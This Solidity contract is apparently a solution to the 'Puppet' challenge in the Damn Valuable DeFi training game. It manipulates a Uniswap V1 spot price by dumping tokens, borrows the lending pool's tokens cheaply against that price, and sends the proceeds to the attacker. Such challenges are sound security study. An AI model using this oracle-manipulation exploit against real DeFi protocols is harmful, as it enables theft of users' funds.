// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

error NotEnoughFunds();
error NotEnoughTokens();

contract PuppetPoolAttack {
    UniswapV1Exchange public immutable uniswapV1Exchange;
    PuppetPool public immutable puppetPool;
    DamnValuableToken public immutable dvt;
    address payable public immutable attacker;

    uint256 public constant INFINITE_DEADLINE = 10_000_000;
    uint256 public constant UINT256_MAX = 2 ** 256 - 1;
    uint256 public constant DECIMALS = 10 ** 18;

    constructor(address _uniswapV1Exchange, address _puppetPool, address _dvt) {
        attacker = payable(address(msg.sender));

        uniswapV1Exchange = UniswapV1Exchange(_uniswapV1Exchange);
        puppetPool = PuppetPool(_puppetPool);
        dvt = DamnValuableToken(_dvt);
    }

    function attack() public {
        // 1. Deposit 1000 DVT to the Uniswap exchange
        dvt.approve(address(uniswapV1Exchange), UINT256_MAX);
        uniswapV1Exchange.tokenToEthSwapInput(1000e18, 1, INFINITE_DEADLINE);

        // 2. Borrow all DVT available from pool
        // The pool does not follow the Uniswap curve, so we can borrow for spot price
        uint256 maxBorrowAmount = calculateBorrowAmount(address(this).balance);
        uint256 poolDVTBalance = dvt.balanceOf(address(puppetPool));
        uint256 borrowAmount = maxBorrowAmount > poolDVTBalance ? poolDVTBalance : maxBorrowAmount;
        puppetPool.borrow{value: address(this).balance}(borrowAmount, address(this));

        // 3. Send everything to the attacker
        dvt.transfer(attacker, dvt.balanceOf(address(this)));
        attacker.transfer(address(this).balance);
    }

    function computeOraclePrice() public view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return (address(uniswapV1Exchange).balance * (10 ** 18)) / dvt.balanceOf(address(uniswapV1Exchange));
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return (amount * computeOraclePrice() * 2) / 10 ** 18;
    }

    function calculateBorrowAmount(uint256 amount) public view returns (uint256) {
        return (amount * 10 ** 18) / (computeOraclePrice() * 2);
    }

    function deposit() public payable {}

    receive() external payable {}
}
